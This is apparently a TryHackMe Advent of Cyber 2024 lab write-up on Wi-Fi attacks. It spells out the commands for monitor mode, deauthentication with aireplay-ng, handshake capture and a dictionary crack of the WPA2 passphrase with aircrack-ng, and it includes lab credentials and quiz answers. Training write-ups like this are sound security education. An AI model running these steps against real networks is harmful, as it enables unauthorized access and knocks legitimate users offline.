# 🎄 TryHackMe Advent of Cyber 2024: Day 11: Wi-Fi Attacks

## Objectives 🎯

Day 11 provides an in-depth exploration of Wi-Fi security and a hands-on demonstration of WPA/WPA2 cracking. This exercise highlights the vulnerabilities in wireless networks and the importance of strong security practices.

### Goals:
1. Learn about Wi-Fi and its critical role in organizations.
2. Understand various Wi-Fi attack techniques.
3. Perform a WPA/WPA2 cracking attack to capture a 4-way handshake and decrypt the Wi-Fi password (PSK).

## Steps 🚀

### Step 1: Preparing the Environment
1. **Start Machines**:  
   - Press the **Start Machine** button to initialize the target machine.  
   - Press the **Start AttackBox** button to set up the AttackBox environment.
2. **SSH into the Target Machine**:  
   Use the credentials provided:
   ```
   ssh glitch@MACHINE_IP
   Password: Password321
   ```

### Step 2: Analyzing Wireless Interfaces
1. **Check Wireless Device Information**:  
   Run `iw dev` to identify available wireless interfaces.  
   - **BSSID of our wireless interface**: `02:00:00:00:02:00`.
2. **Scan for Nearby Networks**:  
   Execute `sudo iw dev wlan2 scan` to list available Wi-Fi networks.  
   - **SSID and BSSID of the access point**: `MalwareM_AP, 02:00:00:00:00:00`.

### Step 3: Setting Monitor Mode
1. **Switch to Monitor Mode**:  
   ```
   sudo ip link set dev wlan2 down
   sudo iw dev wlan2 set type monitor
   sudo ip link set dev wlan2 up
   ```
2. **Confirm Monitor Mode**:  
   Use `sudo iw dev wlan2 info` to verify the interface is now in monitor mode.

### Step 4: Open a Second SSH Terminal
1. **Establish a Second SSH Session**:  
   Open another terminal to create a second SSH session into the target machine. This allows you to monitor Wi-Fi traffic in one session while executing attacks in the other.

2. **Capture Wi-Fi Traffic**:  
   On the first terminal, run `sudo airodump-ng wlan2` to display nearby networks and gather details such as signal strength, channel, and encryption type.  
   - **Focus on the target network**: `MalwareM_AP`.

3. **Target the Access Point**:  
   Run `sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2` to capture the 4-way handshake. Let this command run as you proceed.

### Step 5: Launch a Deauthentication Attack
1. **Identify Connected Clients**:  
   When a client connected to `MalwareM_AP` is detected, its **BSSID** will appear in the STATION section.  
   - **BSSID of the connected client**: `02:00:00:00:01:00`.

2. **Send Deauthentication Packets**:  
   Use `sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2` to disconnect the client and force a handshake.  
   - The captured handshake will appear in the output:  
     **`WPA handshake: 02:00:00:00:00:00`**.

### Step 6: Crack the WPA/WPA2 PSK
1. **Use Aircrack-ng**:  
   Perform a dictionary attack on the captured handshake:
   ```
   sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap
   ```
2. **Decrypted PSK**:  
   - **Password (PSK)**: `fluffy/champ24`.

### Step 7: Connect to the Wi-Fi Network
1. **Generate a Configuration File**:  
   ```
   wpa_passphrase MalwareM_AP 'fluffy/champ24' > config
   ```
2. **Join the Network**:  
   ```
   sudo wpa_supplicant -B -c config -i wlan2
   ```
3. **Verify Connection**:  
   Use `iw dev` to confirm the wireless interface is connected to `MalwareM_AP`.

## Key Findings 🔑

1. **Weak Passwords**:  
   A simple password (`fluffy/champ24`) allowed the network to be cracked quickly, emphasizing the need for strong, complex passphrases.
2. **4-Way Handshake Vulnerability**:  
   WPA/WPA2 handshake data can be exploited for offline attacks, highlighting the importance of secure configurations.
3. **Monitor Mode**:  
   Demonstrates the value of specialized tools for passive network analysis and security auditing.

## Lessons Learned 🌟

### Wi-Fi Security Insights:
- **Secure Passphrases**: Always use strong, complex passwords for Wi-Fi networks.
- **Monitor Mode**: Essential for analyzing network traffic and capturing handshake data.
- **Deauthentication Attacks**: Highlight the vulnerabilities in wireless protocols and the need for additional security layers.

### Tools and Techniques 🛠️
1. **`iw` and `airodump-ng`**: Analyze and monitor wireless networks.
2. **`aireplay-ng`**: Perform deauthentication attacks.
3. **`aircrack-ng`**: Conduct dictionary attacks to crack WPA/WPA2 passwords.

## Final Thoughts 🎁

This challenge reinforces the importance of robust wireless security practices. Organizations should regularly audit their networks, enforce strong password policies, and monitor for rogue access points to protect against unauthorized access.

### Answers ✅
1. **What is the BSSID of our wireless interface?**  
   **Answer**: `02:00:00:00:02:00`

2. **What is the SSID and BSSID of the access point?**  
   **Answer**: `MalwareM_AP, 02:00:00:00:00:00`

3. **What is the BSSID of the wireless interface that is already connected to the access point?**  
   **Answer**: `02:00:00:00:01:00`

4. **What is the PSK after performing the WPA cracking attack?**  
   **Answer**: `fluffy/champ24`

5. **If you enjoyed this task, feel free to check out the Networking module.**  
   **Answer**: No answer needed.

## Table of Contents 📚

| Day  | Challenge                              | Day  | Challenge                               | Day  | Challenge                               |
|------|----------------------------------------|------|-----------------------------------------|------|-----------------------------------------|
| 📖  | [README](../README.md)                 | 9    | [Risk Assessment](days/day9.md)         | 17   | [Log Analysis](days/day_17.md)          |
| 1    | [OPSEC Challenge](days/day1.md)        | 10   | [Phishing](days/day_10.md)              | 18   | [Prompt Injection](days/day_18.md)      |
| 2    | [Log Analysis](days/day2.md)           | 11   | **Wi-Fi Attacks**                       | 19   | [Game Hacking](days/day_19.md)          |
| 3    | [Log Analysis](days/day3.md)           | 12   | [Web Timing Attacks](days/day_12.md)    | 20   | [Traffic Analysis](days/day_20.md)      |
| 4    | [Atomic Red Team](days/day4.md)        | 13   | [WebSockets](days/day_13.md)            | 21   | [Reverse Engineering](days/day_21.md)   |
| 5    | [XXE](days/day5.md)                    | 14   | [Certificate Mismanagement](days/day_14.md)| 22 | [Kubernetes DFIR](days/day_22.md)       |
| 6    | [Sandboxes](days/day6.md)              | 15   | [Active Directory](days/day_15.md)      | 23   | [Hash Cracking](days/day_23.md)         |
| 7    | [AWS Sandboxes](days/day7.md)          | 16   | [Azure Exploitation](days/day_16.md)    | 24   | [Communication Protocols](days/day_24.md)|
| 8    | [Shellcodes](days/day8.md)             |      | **Merry SOC-mas!** 🎁✨☃️              |      | 🎄✨🎅                                |
